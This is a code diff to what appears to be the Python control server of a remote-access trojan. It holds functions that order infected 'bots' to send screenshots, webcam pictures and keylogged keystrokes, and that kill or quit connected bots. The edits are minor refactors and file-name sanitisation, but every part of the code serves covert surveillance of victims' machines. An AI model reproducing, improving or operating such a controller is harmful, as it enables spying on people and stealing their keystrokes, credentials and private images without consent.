@@ -47,7 +47,6 @@ def connection_gate():
             except timeout:
                 if thr_exit.isSet():
                     break
-                pass
         if thr_exit.isSet():
             break
         # noinspection PyUnboundLocalVariable
@@ -212,7 +211,7 @@ def screenshot() -> bool:
         counter = 0
         while True:
             local_filename = 'screenshot-{}-{}-{}.png'.format(connected_sockets[active_bot]['ip'],
-                                                              connected_sockets[active_bot]['username'], str(counter))
+                                                              connected_sockets[active_bot]['username'], str(counter)).replace("\\", "").replace("/", "")
             if not os.path.isfile(local_filename):
                 break
             counter += 1
@@ -232,14 +231,14 @@ def screenshot() -> bool:
 
 
 def webcam_pic() -> bool:
-    """Take a full screen screenshot from the bot.\n"""
+    """Take a picture using bot's webcam.\n"""
     sender('SHwebcampic')
     received_file_data = b64decode(receiver())
     if received_file_data != 'reachedexcept':
         counter = 0
         while True:
             local_filename = 'webcam-pic-{}-{}-{}.png'.format(connected_sockets[active_bot]['ip'],
-                                                              connected_sockets[active_bot]['username'], str(counter))
+                                                              connected_sockets[active_bot]['username'], str(counter)).replace("\\", "").replace("/", "")
             if not os.path.isfile(local_filename):
                 break
             counter += 1
@@ -287,7 +286,7 @@ def keylogdownloader():
     sender('SHkeylogdownload')
     keylogged_data = receiver()
     local_filename = 'keylogged-{}-{}.txt'.format(connected_sockets[active_bot]['ip'],
-                                                  connected_sockets[active_bot]['username'])
+                                                  connected_sockets[active_bot]['username']).replace("\\", "").replace("/", "")
     if keylogged_data == 'reachedexcept':
         receiver(printer=True)
     else:
@@ -303,7 +302,7 @@ def keylogdownloader():
 def keylogshower():
     """Show downloaded keystrokes in a tk window.\n"""
     local_filename = 'keylogged-{}-{}.txt'.format(connected_sockets[active_bot]['ip'],
-                                                  connected_sockets[active_bot]['username'])
+                                                  connected_sockets[active_bot]['username']).replace("\\", "").replace("/", "")
     try:
         keylogged_descriptor = open(local_filename, 'r')
         print(keylogged_descriptor.read())
@@ -328,9 +327,7 @@ def kill_current_bot() -> bool:
     if double_check == 'yes':
         sender('SHkill')
         response = receiver()
-        if response == 'mistochiudendo':
-            pass
-        else:
+        if response != 'mistochiudendo':
             logging(data_to_log=response, printer=True)
         connected_sockets[active_bot]['status'] = False
         return True
@@ -354,9 +351,7 @@ def quit_utility() -> bool:
                 else:
                     sender('SHquit')
                 response = receiver()
-                if response == 'mistochiudendo':
-                    pass
-                else:
+                if response != 'mistochiudendo':
                     logging(data_to_log=response, printer=True)
         thr_exit.set()
         return True
